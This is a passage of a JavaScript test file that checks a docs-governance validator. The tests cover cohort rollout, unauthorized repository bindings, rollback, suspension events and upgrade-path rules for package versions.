  appendEvent(successor.cohort_id, "COOLDOWN", "2026-08-18T06:00:00Z");
  appendEvent(successor.cohort_id, "QUALIFIED", "2026-08-19T04:00:00Z");
  const policy = structuredClone(docsPolicy);
  const consumer = policy.repositories.find(({ repository }) => repository === "agent-teams-ai/agent-runtime");
  const observed = staged.cohorts[0];
  consumer.cohort_binding_status = "rollout_pending";
  consumer.desired_cohort_id = successor.cohort_id;
  consumer.observed_cohort_id = observed.cohort_id;
  consumer.observed_cohort_record_digest = observed.record_digest;
  consumer.observed_cohort_event_digest = staged.events.find(
    ({ cohort_id, state }) => cohort_id === observed.cohort_id && state === "QUALIFIED",
  ).event_digest;
  consumer.exact_foundation_version = observed.packages[0].version;
  consumer.exact_package_version = observed.packages[1].version;
  consumer.reusable_workflow_revision = observed.reusable_workflow.revision;
  consumer.required_check_context = "docs-protocol / docs-protocol-check";
  consumer.observed_default_branch_evidence = defaultBranchEvidence(
    consumer.repository,
    consumer.qualification.observed_revision,
  );
  assert.doesNotThrow(() => validateDocsGovernanceReferences(
    staged, exceptions, policy, securityPolicy, { asOf: "2026-08-19T04:00:00Z" },
  ));
  assert.throws(() => validateDocsGovernanceReferences(
    staged, exceptions, policy, securityPolicy, { asOf: "2026-09-18T03:00:00Z" },
  ), /no longer supported/u);

  const unauthorized = structuredClone(policy);
  const platform = unauthorized.repositories.find(
    ({ repository }) => repository === "agent-teams-ai/agent-teams-platform",
  );
  Object.assign(platform, {
    cohort_binding_status: "rollout_pending",
    desired_cohort_id: successor.cohort_id,
    observed_cohort_id: observed.cohort_id,
    observed_cohort_record_digest: observed.record_digest,
    observed_cohort_event_digest: consumer.observed_cohort_event_digest,
    exact_foundation_version: observed.packages[0].version,
    exact_package_version: observed.packages[1].version,
    reusable_workflow_revision: observed.reusable_workflow.revision,
    required_check_context: "docs-protocol / docs-protocol-check",
    observed_default_branch_evidence: defaultBranchEvidence(
      platform.repository,
      platform.qualification.observed_revision,
    ),
  });
  assert.throws(() => validateDocsGovernanceReferences(
    staged, exceptions, unauthorized, securityPolicy, { asOf: "2026-08-19T04:00:00Z" },
  ), /not currently selectable/u);

  const rollback = structuredClone(policy);
  const rollbackConsumer = rollback.repositories.find(
    ({ repository }) => repository === "agent-teams-ai/agent-runtime",
  );
  const successorQualification = staged.events.find(
    ({ cohort_id: cohortId, state }) =>
      cohortId === successor.cohort_id && state === "QUALIFIED",
  );
  Object.assign(rollbackConsumer, {
    cohort_binding_status: "rollout_pending",
    desired_cohort_id: observed.cohort_id,
    observed_cohort_id: successor.cohort_id,
    observed_cohort_record_digest: successor.record_digest,
    observed_cohort_event_digest: successorQualification.event_digest,
    exact_foundation_version: successor.packages[0].version,
    exact_package_version: successor.packages[1].version,
    reusable_workflow_revision: successor.reusable_workflow.revision,
    observed_default_branch_evidence: defaultBranchEvidence(
      rollbackConsumer.repository,
      rollbackConsumer.qualification.observed_revision,
    ),
  });
  assert.doesNotThrow(() => validateDocsGovernanceReferences(
    staged, exceptions, rollback, securityPolicy, { asOf: "2026-08-19T04:00:00Z" },
  ));

  const suspendedSource = structuredClone(staged);
  const suspension = {
    sequence: suspendedSource.events.length + 1,
    cohort_id: successor.cohort_id,
    state: "SUSPENDED",
    effective_at: "2026-08-19T05:00:00Z",
    support_until: null,
    evidence_references: ["governance/evidence/successor-suspension.json"],
    canary_evidence: [],
    previous_event_digest: suspendedSource.events.at(-1).event_digest,
    event_digest: `sha256:${"0".repeat(64)}`,
  };
  suspension.event_digest = cohortEventDigest(suspension);
  suspendedSource.events.push(suspension);
  assert.doesNotThrow(() => validateDocsGovernanceReferences(
    suspendedSource, exceptions, rollback, securityPolicy, { asOf: "2026-08-19T05:00:00Z" },
  ));

  successor.upgrade_from = [];
  successor.record_digest = cohortRecordDigest(successor);
  assert.throws(() => validateDocsGovernanceReferences(
    staged, exceptions, policy, securityPolicy, { asOf: "2026-08-19T04:00:00Z" },
  ), /explicit (?:migration|upgrade)/u);
});
